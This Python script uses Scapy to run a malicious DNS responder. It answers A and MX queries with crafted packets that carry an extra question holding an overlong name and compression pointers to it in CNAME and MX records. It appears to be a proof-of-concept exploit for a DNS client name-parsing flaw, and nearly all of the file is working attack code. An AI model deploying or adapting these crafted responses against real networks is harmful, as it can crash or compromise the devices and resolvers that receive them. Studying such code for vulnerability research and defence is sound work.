from scapy.all import *
from argparse import ArgumentParser
import struct
import base64
from dns_long_name import *

def p32(b):
    return struct.pack(">I", b) # big-endian

def p16(b):
    return struct.pack(">H", b) # big-endian

def p8(b):
    return struct.pack(">B", b) # big-endian

class DnsResponder(AnsweringMachine):
    filter = "udp port 53"

    RESPONDER_TYPE_ANY = 'ANY'
    SUPPORTED_RESPONDER_TYPES = ['A', 'AAAA', 'MX', RESPONDER_TYPE_ANY]
    DNS_HDR_LEN = 0xc
    JOKER_IP = '66.66.66.66'  # Bogus IP address returned by the responder
    DNS_IN_CLASS = 0x1

    def __init__(self, responder_type, **kwargs):
        AnsweringMachine.__init__(self, **kwargs)

        self.qtype_to_rpl_func = {
            0x1: DnsResponder.build_reply_A,
            0xf: DnsResponder.build_reply_MX,
            0x1c: DnsResponder.build_reply_AAAA
        }

        self.dns_types = {
            DnsResponder.RESPONDER_TYPE_ANY: 0x0, # sentinel type
            'A': 0x1,
            'NS': 0x2,
            'CNAME': 0x5,
            'PTR': 0xc,
            'MX': 0xf,
            'AAAA': 0x1c
        }

        self.responder_type = self.dns_types[responder_type]

    def type2name(self, t):
        for named_type, type_value in self.dns_types.items():
            if type_value == t:
                return named_type
        return '?'

    def print_reply(self, req, reply):
        qtype = req[DNS].qd.qtype
        print("[+] Reply to type %s(0x%x) query for domain: %s [reply length: 0x%x]" % (self.type2name(qtype), qtype, req[DNS].qd.qname.decode('utf-8'), len(reply[DNS])))

    def is_request(self, req):
        if not req.haslayer(DNS):  # DNS packet
            return False
        dns_req = req.getlayer(DNS)
        if dns_req.qr != 0:  # DNS query
            return False
        # check if the responder should respond to any type; if not, check that the query type
        # matches the responder type.
        if self.responder_type != 0 and dns_req.qd.qtype != self.responder_type:
            return False
        return True

    def make_reply(self, req):
        ip = req.getlayer(IP)
        dns = req.getlayer(DNS)

        resp = IP(dst=ip.src, src=ip.dst) / UDP(dport=ip.sport, sport=ip.dport)
        resp /= self.get_dns_reply(dns)
        
        return resp

    def get_dns_reply(self, dns_req):
        dns_rpl = self.qtype_to_rpl_func[dns_req.qd.qtype](self, dns_req)
        assert len(dns_rpl) <= 0x5b4, "dns packet too long: 0x%x" % len(dns_rpl)
        return dns_rpl

    def build_reply_A(self, dns_req):
        offset_from_header = DnsResponder.DNS_HDR_LEN + len(dns_req.qd)
        #long_name, ref_to_long_name = build_long_name(4, b'X'*63, offset_from_header)
        long_name, ref_to_long_name = build_long_name(4, b'000010002001100120021002201010201110112012101220202110212022102', offset_from_header)

        # Header
        dns_rpl = DNS(id=dns_req.id, qr=1, qdcount=2, ancount=2)

        # Questions
        dns_rpl /= dns_req.qd
        dns_rpl /= long_name + p16(self.dns_types['A']) + p16(DnsResponder.DNS_IN_CLASS)

        # Answers
        dns_rpl /= DNSRR(rrname=index_to_compression(DnsResponder.DNS_HDR_LEN),
                        type=self.dns_types['A'],
                        rdata=DnsResponder.JOKER_IP)
        dns_rpl /= DNSRR(rrname=index_to_compression(DnsResponder.DNS_HDR_LEN),
                        type=self.dns_types['CNAME'],
                        rdata=ref_to_long_name)
        return dns_rpl
    
    def build_reply_MX(self, dns_req):
        offset_from_header = DnsResponder.DNS_HDR_LEN + len(dns_req.qd)
        long_name, ref_to_long_name = build_long_name(4, b'X'*63, offset_from_header)

        # Header
        dns_rpl = DNS(id=dns_req.id, qr=1, qdcount=2, ancount=1)

        # Questions
        dns_rpl /= dns_req.qd
        dns_rpl /= long_name + p16(self.dns_types['A']) + p16(DnsResponder.DNS_IN_CLASS)

        # Answers
        dns_rpl /= bytes(DNSRRMX(rrname=index_to_compression(DnsResponder.DNS_HDR_LEN),
                                type=self.dns_types['MX'],
                                preference=1,
                                exchange=ref_to_long_name))
        return dns_rpl

    def build_reply_AAAA(self, dns_req):
        # Not yet implemented
        return None

def print_headline(msg):
    print("="*(len(msg) + 4))
    print("= " + str(msg) + " =")
    print("="*(len(msg) + 4))

def main(iface, responder_type):
    print_headline("DNS Responder started (respond to queries of type: {})".format(responder_type))
    responder = DnsResponder(responder_type, iface=iface)
    responder.run()

if __name__ == '__main__':
    parser = ArgumentParser()

    parser.add_argument('-i', '--iface',
                        dest='iface',
                        help='The interface to listen for DNS requests on')
    parser.add_argument('-t', '--type', dest='responder_type',
                        default=DnsResponder.RESPONDER_TYPE_ANY,
                        choices=DnsResponder.SUPPORTED_RESPONDER_TYPES,
                        help='Respond only to the specified query type (default: {})'.format(DnsResponder.RESPONDER_TYPE_ANY))

    args = parser.parse_args()

    iface = args.iface
    if iface is not None and iface.isdigit():
        iface = IFACES.dev_from_index(int(iface)).description

    main(iface, args.responder_type)